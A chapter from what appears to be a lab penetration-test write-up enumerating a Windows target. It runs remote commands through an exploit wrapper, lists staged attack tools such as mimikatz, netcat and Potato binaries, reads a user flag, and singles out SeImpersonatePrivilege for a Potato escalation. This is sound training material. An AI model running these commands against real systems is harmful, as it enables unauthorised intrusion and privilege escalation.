# 04 — Enumeration

One `whoami /all` decides this box. Everything after it is execution detail.

| Step | Runs on |
|---|---|
| 4.1 Identity and privileges | Kali → target |
| 4.2 What is staged on the host | Kali → target |
| 4.3 File access, and what it rules out | Kali → target |
| 4.4 Triage | — |

---

## 4.1 Identity and privileges

`whoami /all` through the wrapper works, and unlike a bare `whoami` it prints to stdout reliably:

**On Kali**

```bash
python3 1.py 192.168.137.151 "powershell whoami /all"
```

```
Authenticated
Content-Type: api/response
Content-Length: 2441

USER INFORMATION
----------------

User Name  SID
========== =============================================
oscp\chris S-1-5-21-861469990-2748031089-4170181761-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            Well-known group S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase process working set              Disabled
SeTimeZonePrivilege           Set the system time zone                  Disabled
```

**Reading it**, one line at a time:

| Observation | Consequence |
|---|---|
| `oscp\chris`, SID `-1001` | a locally created account (RID 1001), machine local — the host is in `WORKGROUP` |
| `BUILTIN\Users` only | no local admin, no backup operator, no RDP group. Token-based escalation only |
| `NT AUTHORITY\SERVICE` | the PBX is running as a Windows **service**, which is why every process inherits that context |
| `Mandatory Label\High Mandatory Level` | the service token is **elevated** (high IL), not a filtered admin token |
| `SeImpersonatePrivilege ... Enabled` | **the whole box in one line** — this is the Potato precondition |
| `SeCreateGlobalPrivilege ... Enabled` | secondary; also useful for named-object tricks |

The combination is unusual and worth naming: a *high-integrity* token belonging to a *non-admin*
user with `SeImpersonatePrivilege` enabled. High IL means the token is not restricted, so an
impersonated SYSTEM token can be used to create a process — which is exactly what the Potato family
needs, and what chapter 05 does.

`NT AUTHORITY\SERVICE` also explains an observation from chapter 03: this is a service logon, so
there is no interactive desktop and no user profile loaded for a GUI session.

## 4.2 What is staged on the host

**On Kali**

```bash
python3 1.py 192.168.137.151 "cmd /c dir /b C:\Users\chris\AppData\Local\Temp 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 1146

.ses
18e190413af045db88dfbd29609eb877.db
18e190413af045db88dfbd29609eb877.db.session64
AccessChk64.exe
agent.exe
bypass.ps1
chisel.exe
Costura
CVE-2023-29360.exe
dd_vcredist_amd64_20221031141632.log
GodPotato-NET4.exe
Invoke-ConPtyShell.ps1
Invoke-PowerShellTcp.ps1
JuicyPotatoNG.exe
Low
mimikatz.exe
nc.exe
nc64.exe
plink.exe
PowerUp.ps1
PrintSpoofer32.exe
PrintSpoofer64.exe
PrivescCheck.ps1
procdump64.exe
PsExec64.exe
recon_OSCP_20261118_175118.txt
run.ps1
RunasCs.exe
SafetyKatz.exe
Seatbelt.exe
SharpChrome.exe
SharpDPAPI.exe
SharpEDRChecker.exe
SharpTask.exe
SharpUp.exe
SigmaPotato.exe
SweetPotato.exe
Watson.exe
winPEASx64.exe
winPEASx86.exe
```

A full toolset is already in `chris`'s temp directory from the enumeration phase of this box: three
Potato variants (`GodPotato-NET4`, `JuicyPotatoNG`, `PrintSpoofer64`, plus `SigmaPotato` and
`SweetPotato`), `nc`/`nc64`, `mimikatz`, `winPEAS`, `PowerUp` and `Seatbelt`.

Two things this saves and one it costs:

- **Saves** a staging step — the escalation binary is already local, no download needed.
- **Saves** the `certutil` round trip in the middle of the escalation, which is where quoting bugs live.
- **Costs** nothing here, but note the `.db.session64` and `.ses` files: `chris` has been running
  tools that keep state in this directory.

`AccessChk64.exe` is present and useful for one specific question: who can read the flag.

## 4.3 File access, and what it rules out

The user flag sits on `chris`'s own desktop and is readable:

**On Kali**

```bash
python3 1.py 192.168.137.151 "type C:\Users\chris\Desktop\local.txt 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 33

9d05eefc0447258ceab32e91e3b54aac
```

The administrator's desktop is a different story:

**On Kali**

```bash
python3 1.py 192.168.137.151 "type C:\Users\Administrator\Desktop\proof.txt 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 18

Access is denied.
```

**Reading it:** `Access is denied` is a real answer, and a useful one. It proves:

- the file **exists** at that path (a wrong path returns `The system cannot find the file specified`),
- and `chris` cannot read it, so nothing in a standard-user context will ever retrieve it.

That is the negative control for chapter 05. If a later "escalation" had read this file, the ACL
would have had to be wrong; instead the escalation has to change *who is asking*.

There is no `proof.txt` on `chris`'s own desktop — the only file there is `local.txt`. Any zero-byte
or missing result on this box has to be explained, not assumed: `dir /b` on an **empty** directory
also returns `File Not Found`, which is indistinguishable from a bad path if only stdout is captured.

## 4.4 Triage

| Finding | Verdict |
|---|---|
| `chris` is in `BUILTIN\Users` only | no group-based path; the token is the target |
| High Mandatory Level | the token is not filtered — a stolen SYSTEM token will be usable |
| `SeImpersonatePrivilege` enabled | **Potato attack** — the intended path |
| `SeCreateGlobalPrivilege` enabled | consistent with the service context; not needed here |
| Service logon (`NT AUTHORITY\SERVICE`) | session 0, no desktop, no profile |
| `proof.txt` denied to `chris` | confirms elevation is required, and gives a control for later |
| Full toolset in `Temp` | escalation binary already on disk |

The intended vulnerability class is decided at this point: **`SeImpersonatePrivilege` plus a
high-integrity token** on a Windows 10 host with no patch to apply and no local admin group to abuse.

→ [05 — Privilege escalation](05-privilege-escalation.md)
